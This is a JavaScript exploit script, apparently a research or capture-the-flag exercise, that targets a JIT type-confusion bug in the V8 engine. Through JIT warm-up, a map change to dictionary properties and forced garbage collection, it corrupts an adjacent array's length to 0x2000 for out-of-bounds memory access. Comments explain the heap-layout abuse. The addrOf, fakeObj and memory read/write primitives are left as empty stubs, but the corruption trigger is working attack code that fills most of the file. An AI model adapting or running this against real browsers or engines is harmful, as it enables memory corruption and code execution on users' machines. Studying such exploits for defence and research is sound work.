/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

/**************************************************************
 *             _            
 *    ___ ___ | | ___  _ __ 
 *   / __/ _ \| |/ _ \| '__|
 *  | (_| (_) | | (_) | |   
 *   \___\___/|_|\___/|_|   
 *                          
 **************************************************************/
const RED       = "\033[0;31m";
const BLUE      = "\033[0;34m";
const GREEN     = "\033[0;32m";
const RESET     = "\033[0;0m";

function info() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(BLUE + "[*]", msg, RESET);
}

function success() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(GREEN + "[+]", msg, RESET);
}

function error() {
    let msg = Array.prototype.join.call(arguments, " ");
    console.log(RED + "[!]", msg, RESET);
}

/**************************************************************
 *   _          _                     
 *  | |__   ___| |_ __   ___ _ __ ___ 
 *  | '_ \ / _ \ | '_ \ / _ \ '__/ __|
 *  | | | |  __/ | |_) |  __/ |  \__ \
 *  |_| |_|\___|_| .__/ \___|_|  |___/
 *               |_|                  
 * 
 **************************************************************/
function dp(o) {
    %DebugPrint(o); 
}

function breakpoint() {
    %SystemBreak();
}

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return u64_buf[0] + (u64_buf[1] * 0x100000000); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = parseInt(val % 0x100000000);
    u64_buf[1] = parseInt((val - u64_buf[0]) / 0x100000000);
    return f64_buf[0];
}

function hex(val) {
    return "0x" + Number(val).toString(16);
}

/**************************************************************
 *                   _       _ _   
 *    _____  ___ __ | | ___ (_) |_ 
 *   / _ \ \/ / '_ \| |/ _ \| | __|
 *  |  __/>  <| |_) | | (_) | | |_ 
 *   \___/_/\_\ .__/|_|\___/|_|\__|
 *            |_|                  
 * 
 **************************************************************/
function addrOf(o) {
    // return address of o: Object
}

function fakeObj(addr) {
    // return object with address addr: BigInt
}

function readData(addr) {
    // return data under address addr: BigInt
}

function writeData(addr, val) {
    // write data to address
}

function f(o, g) {
	// first CheckMap is invoked here
	const x = o.x;
	g();
	/*
     * rewrite length field of array to 0x2000
     * here the second CheckMap occurs, we want to make compiler remove that
     * after successfully getting rid of the check, we can make g() to 
     * change the map of Object _o_ from _FastProperties_ to _DictionaryProperties_
     *
     * the difference between _FastProperties_ and _DictionaryProperties_ is that
     * in case of fast ones the properties are placed just after the object
     * and address _properties_ is the dummy one (same as elements)
     * and in dictionary properties object has properties defined as HashTable in
     * different place pointed by _properties_ value
     *
     * we are abusing that fact with accessing _o.d_ which is at index 8 in
     * _FastProperties_ object, and at this place, after corrupting the maps,
     * the length of _arr_ is placed
     */
	o.d = 0x2000;
}

a = [1.1];
for (var i = 0; i < 0x1000; i++) {
    /*
	 * trigger JIT
	 * call with different g is to prevent inlining optimization
     */
	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>1);
	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>2);
	f({x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9}, ()=>3);
}
obj = {x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9};
/* 
 * put an array, a ArrayBuffer, a signature object after obj
 * this even holds after GC is triggered
 */
arr = [1.1, 2.2];
const ab = new ArrayBuffer(0x123);
const sig = {a: 0xdead, b: 0xbeef, c: (()=>1)};

function g() {
    /*
     * here, we are converting the _obj_ from _FastProperties_
     * to _DictionaryProperties_ object by defining getter two times (?)
     * I don't know why we have to do this two times, but after first run of
     * __defineGetter__() function, the object is still of type _FastProperties_
     */
	obj.__defineGetter__('xx', ()=>3);
	obj.__defineGetter__('xx', ()=>3);
	// trigger GC
	for (var i = 0; i < 0x10; i++)
		new ArrayBuffer(0x1000000);
}

// trigger vulnerability
f(obj, g);

if (arr.length !== 0x2000)
	throw Error("failed to corrupt array length");
